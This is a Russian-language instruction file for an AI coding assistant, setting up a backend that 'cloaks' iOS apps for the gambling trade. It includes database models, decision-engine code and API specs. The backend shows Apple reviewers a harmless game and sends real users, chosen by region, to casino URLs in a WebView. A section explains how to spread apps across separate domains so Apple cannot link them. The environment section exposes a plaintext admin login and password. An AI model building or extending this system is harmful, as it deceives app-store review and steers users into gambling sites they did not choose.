# Mobile Cloaking API - Инструкции для Claude Code

## Описание проекта

Backend для iOS-приложений с механизмом "клоаки" (cloaking) для гемблинг-вертикали.

**Бизнес-логика:**
- При проверке модератором Apple → возвращаем 200 (легальное приложение/игра)
- При заходе реального пользователя → возвращаем 400 с URL казино (открывается WebView)

**GEO-таргетинг:**
- Офферы привязаны к регионам (EE, HU, PL и т.д.)
- Автоматический выбор оффера по `device.region` из запроса
- Fallback на default оффер если нет точного совпадения

## Технический стек

- **Framework:** FastAPI + Uvicorn/Gunicorn
- **Database:** PostgreSQL 16 (async)
- **ORM:** SQLModel + SQLAlchemy (asyncpg)
- **Admin:** Starlette Admin
- **Migrations:** Alembic
- **Deploy:** Docker Compose

## Структура проекта

```
mobile-cloaking/
├── app/
│   ├── __init__.py
│   ├── main.py                        # create_app() factory
│   │
│   ├── admin/                         # Starlette Admin
│   │   ├── __init__.py
│   │   ├── panel.py                   # AdminPanel class + mount
│   │   └── auth/
│   │       ├── __init__.py
│   │       └── provider.py            # CustomAuthProvider
│   │
│   ├── api/                           # Публичные API
│   │   ├── __init__.py
│   │   └── v1/
│   │       ├── __init__.py
│   │       ├── router.py              # APIRouter prefix="/api/v1"
│   │       └── deps.py                # get_db, get_headers
│   │
│   ├── table/                         # Каждая таблица = папка
│   │   ├── __init__.py
│   │   │
│   │   ├── app/                       # Приложения (bundle_id)
│   │   │   ├── __init__.py
│   │   │   ├── model.py               # App SQLModel
│   │   │   ├── view.py                # AppView для админки
│   │   │   └── enums.py               # AppMode, UpdateMode
│   │   │
│   │   ├── geo/                       # Регионы/страны
│   │   │   ├── __init__.py
│   │   │   ├── model.py               # Geo SQLModel
│   │   │   └── view.py                # GeoView
│   │   │
│   │   ├── offer/                     # Офферы казино
│   │   │   ├── __init__.py
│   │   │   ├── model.py               # Offer SQLModel
│   │   │   └── view.py                # OfferView
│   │   │
│   │   ├── client/                    # Устройства/клиенты
│   │   │   ├── __init__.py
│   │   │   ├── model.py               # Client SQLModel
│   │   │   ├── view.py                # ClientView
│   │   │   ├── schemas.py             # InitRequest, InitResponse
│   │   │   ├── route.py               # POST /client/init
│   │   │   └── service.py             # InitService, DecisionEngine
│   │   │
│   │   ├── event/                     # Аналитические события
│   │   │   ├── __init__.py
│   │   │   ├── model.py               # Event SQLModel
│   │   │   ├── view.py                # EventView
│   │   │   ├── schemas.py             # EventRequest
│   │   │   ├── route.py               # POST /client/event
│   │   │   ├── service.py             # EventService
│   │   │   └── enums.py               # EventType enum
│   │   │
│   │   └── init_log/                  # Логи инициализаций
│   │       ├── __init__.py
│   │       ├── model.py
│   │       └── view.py
│   │
│   ├── db/                            # База данных
│   │   ├── __init__.py
│   │   ├── database.py                # Database class (async engine)
│   │   └── base.py                    # import all models
│   │
│   ├── utils/                         # Утилиты
│   │   ├── __init__.py
│   │   ├── logger.py                  # Loguru setup
│   │   └── model_fields.py            # created_at, updated_at helpers
│   │
│   └── schemas/                       # Общие схемы
│       ├── __init__.py
│       └── common.py                  # ATTStatus enum
│
├── migrations/                        # Alembic
│   ├── env.py
│   ├── script.py.mako
│   └── versions/
│
├── config.py                          # Pydantic Settings
├── docker-compose.yml
├── Dockerfile
├── requirements.txt
├── alembic.ini
├── start-up.sh
├── stack.env.example
└── README.md
```

---

## Модели базы данных

### Table: apps

```python
class App(SQLModel, table=True):
    __tablename__ = "apps"

    id: int | None = Field(default=None, primary_key=True)
    bundle_id: str = Field(unique=True, index=True)  # com.company.app
    name: str | None = None                           # Человекочитаемое имя

    # Режим работы
    mode: AppMode = Field(default=AppMode.NATIVE)     # native / casino

    # Настройки prompts
    rate_delay_sec: int = Field(default=180)
    push_delay_sec: int = Field(default=60)

    # Настройки обновлений
    min_version: str | None = None
    latest_version: str | None = None
    update_mode: UpdateMode | None = None             # soft / force
    appstore_url: str | None = None

    # Мета
    is_active: bool = Field(default=True)
    created_at: datetime
    updated_at: datetime
```

**Enums:**
```python
class AppMode(str, Enum):
    NATIVE = "native"   # 200 ответ
    CASINO = "casino"   # 400 ответ с result

class UpdateMode(str, Enum):
    SOFT = "soft"
    FORCE = "force"
```

### Table: geos

```python
class Geo(SQLModel, table=True):
    __tablename__ = "geos"

    id: int | None = Field(default=None, primary_key=True)

    # ISO 3166-1 alpha-2 code
    code: str = Field(unique=True, index=True)  # EE, HU, PL, US
    name: str                                    # Estonia, Hungary

    # Fallback geo
    is_default: bool = Field(default=False)      # Если true - используется как fallback

    is_active: bool = Field(default=True)
    created_at: datetime
    updated_at: datetime
```

### Table: offers

```python
class Offer(SQLModel, table=True):
    __tablename__ = "offers"

    id: int | None = Field(default=None, primary_key=True)

    # Связи
    app_id: int = Field(foreign_key="apps.id", index=True)
    geo_id: int = Field(foreign_key="geos.id", index=True)

    # Оффер
    name: str                                    # "Pin-Up Hungary"
    url: str                                     # https://casino.com/?sub=...

    # Приоритет
    priority: int = Field(default=0)             # Чем выше - приоритетнее
    weight: int = Field(default=100)             # Для A/B тестов

    is_active: bool = Field(default=True)
    created_at: datetime
    updated_at: datetime
```

### Table: clients

```python
class Client(SQLModel, table=True):
    __tablename__ = "clients"

    id: int | None = Field(default=None, primary_key=True)
    internal_id: str = Field(unique=True, index=True)  # UUID из Keychain

    # Связь с приложением
    app_id: int = Field(foreign_key="apps.id")

    # Версия приложения
    app_version: str

    # Device info
    language: str
    timezone: str
    region: str                                  # EE, HU - для выбора оффера

    # Privacy
    att_status: ATTStatus
    idfa: str | None = None

    # Attribution
    appsflyer_id: str | None = None

    # Push
    push_token: str | None = None

    # Activity
    first_seen_at: datetime
    last_seen_at: datetime
    sessions_count: int = Field(default=1)
```

### Table: events

```python
class Event(SQLModel, table=True):
    __tablename__ = "events"

    id: int | None = Field(default=None, primary_key=True)

    # Связи
    client_id: int = Field(foreign_key="clients.id", index=True)
    app_id: int = Field(foreign_key="apps.id", index=True)

    # Event data
    name: str = Field(index=True)                # rate_sheet_shown
    event_ts: datetime                           # Время на устройстве
    props: dict | None = Field(default=None, sa_type=JSONB)

    # App context
    app_version: str

    # Server time
    received_at: datetime = Field(default_factory=datetime.utcnow)
```

---

## Бизнес-логика

### Decision Engine (Логика принятия решений)

```python
class InitService:
    async def get_offer_for_geo(self, app_id: int, region: str) -> Offer | None:
        """Find best offer for app and geo region.

        Priority:
        1. Exact geo match (e.g., region="EE" matches geo.code="EE")
        2. Default geo (geo.is_default=True)
        3. None if no offers found
        """
        # 1. Try exact geo match
        stmt = (
            select(Offer)
            .join(Geo)
            .where(
                Offer.app_id == app_id,
                Offer.is_active == True,
                Geo.is_active == True,
                Geo.code == region,
            )
            .order_by(Offer.priority.desc())
            .limit(1)
        )
        result = await self.session.execute(stmt)
        offer = result.scalar_one_or_none()

        if offer:
            return offer

        # 2. Fallback to default geo
        stmt = (
            select(Offer)
            .join(Geo)
            .where(
                Offer.app_id == app_id,
                Offer.is_active == True,
                Geo.is_active == True,
                Geo.is_default == True,
            )
            .order_by(Offer.priority.desc())
            .limit(1)
        )
        result = await self.session.execute(stmt)
        return result.scalar_one_or_none()


class DecisionEngine:
    @staticmethod
    def decide(app: App, offer: Offer | None) -> tuple[int, Response]:
        """Return (status_code, response_body)."""
        prompts = PromptsConfig(
            rate_delay_sec=app.rate_delay_sec,
            push_delay_sec=app.push_delay_sec,
        )

        update = UpdateConfig(...) if app.min_version else None

        # Casino mode with valid offer
        if app.mode == AppMode.CASINO and offer:
            return 400, InitResponseCasino(
                result=offer.url,
                prompts=prompts,
                update=update,
            )

        # Native mode (or no offer found)
        return 200, InitResponseNative(
            prompts=prompts,
            update=update,
        )
```

### Диаграмма выбора оффера

```
           ┌─────────────────────────────────────┐
           │  POST /api/v1/client/init           │
           │  device.region = "EE"               │
           └───────────────┬─────────────────────┘
                           │
                           ▼
           ┌─────────────────────────────────────┐
           │  App.mode == CASINO ?               │
           └───────────────┬─────────────────────┘
                           │
              ┌────────────┴────────────┐
              │ YES                     │ NO
              ▼                         ▼
    ┌─────────────────────┐    ┌─────────────────────┐
    │ Поиск Offer:        │    │ Return 200          │
    │ app_id + geo="EE"   │    │ Native mode         │
    └─────────┬───────────┘    └─────────────────────┘
              │
              ▼
    ┌─────────────────────┐
    │ Найден?             │
    └─────────┬───────────┘
              │
     ┌────────┴────────┐
     │ YES             │ NO
     ▼                 ▼
┌──────────┐   ┌─────────────────────┐
│ 400      │   │ Поиск default Offer │
│ + URL    │   │ geo.is_default=true │
└──────────┘   └─────────┬───────────┘
                         │
                ┌────────┴────────┐
                │ YES             │ NO
                ▼                 ▼
          ┌──────────┐     ┌──────────┐
          │ 400      │     │ 200      │
          │ + URL    │     │ Native   │
          └──────────┘     └──────────┘
```

---

## API Endpoints

### 1. POST /api/v1/client/init

**Назначение:** "Фейс-контроль" при запуске приложения.

#### Request Body:

```json
{
  "schema": 1,
  "app": {
    "bundle_id": "com.company.app",
    "version": "1.0"
  },
  "device": {
    "language": "en-EE",
    "timezone": "Europe/Budapest",
    "region": "EE"
  },
  "privacy": {
    "att": "authorized"
  },
  "ids": {
    "internal_id": "UUID",
    "idfa": "UUID"
  },
  "attribution": {
    "appsflyer_id": "..."
  },
  "push": {
    "token": "..."
  }
}
```

#### Response 200 OK (нативный режим):

```json
{
  "prompts": {
    "rate_delay_sec": 180,
    "push_delay_sec": 60
  },
  "update": {
    "min_version": "1.0",
    "latest_version": "1.2",
    "mode": "soft",
    "appstore_url": "itms-apps://..."
  }
}
```

#### Response 400 Bad Request (режим казино):

```json
{
  "result": "https://casino-link.com/?param=value",
  "prompts": {...},
  "update": {...}
}
```

### 2. POST /api/v1/client/event

**Назначение:** Логирование пользовательских событий.

#### Request Body:

```json
{
  "schema": 1,
  "app": {"bundle_id": "com.company.app", "version": "1.0"},
  "ids": {"internal_id": "UUID"},
  "event": {
    "name": "rate_sheet_shown",
    "ts": 1734541234,
    "props": null
  }
}
```

#### Response: `200 OK` с `{}`

---

## Админ-панель

### Разделы:

| Раздел | Описание |
|--------|----------|
| **Apps** | Приложения (bundle_id, mode, настройки prompts/update) |
| **Geos** | Регионы/страны (ISO коды, default флаг) |
| **Offers** | Офферы (URL привязан к App + Geo, priority) |
| **Clients** | Устройства (read-only, создаются через API) |
| **Events** | События (read-only, создаются через API) |
| **Init Logs** | Логи инициализаций (read-only) |

### Авторизация:

- `ADMIN_LOGIN` и `ADMIN_PASSWORD` в env
- Session-based auth
- CustomAuthProvider для Starlette Admin

---

## Конфигурация

### Порты (по умолчанию)

| Сервис | Порт |
|--------|------|
| API/Admin | 8100 |
| PostgreSQL (external) | 5440 |
| Adminer | 8180 |

### stack.env

```env
# Database
POSTGRES_HOST=db
POSTGRES_PORT=5432
POSTGRES_EXTERNAL_PORT=5440
POSTGRES_USER=postgres
POSTGRES_PASSWORD=postgres
POSTGRES_DB=cloaking

# App
DEBUG=true
WORKERS=4
PORT=8100

# Admin
ADMIN_LOGIN=mazamaka
ADMIN_PASSWORD=Zxcvbn321
AUTH_SECRET=your-secret-key

# Ports (for docker-compose)
ADMINER_PORT=8180
```

---

## Изоляция приложений для Apple

**Проблема:** Apple не должен видеть что разные приложения ходят на один домен.

**Решение:** Уникальные домены для каждого приложения:

```
App 1 (com.game.puzzle)    → api-puzzle.example1.com
App 2 (com.slots.vegas)    → api-vegas.example2.com
App 3 (com.cards.poker)    → api-poker.example3.com
                                    │
                                    ▼
                           Единый Backend
                           (определяет App по bundle_id)
```

Настройка в Cloudflare: разные домены → один IP.

---

## Важные замечания

1. **НЕ создавай миграции автоматически** - только по запросу пользователя
2. **НЕ деплой на сервер** без явного подтверждения
3. Используй MCP context7 для получения актуальной документации
4. Для актуальных примеров библиотек смотри в `/Users/admin/PycharmProjects/DOCS/`
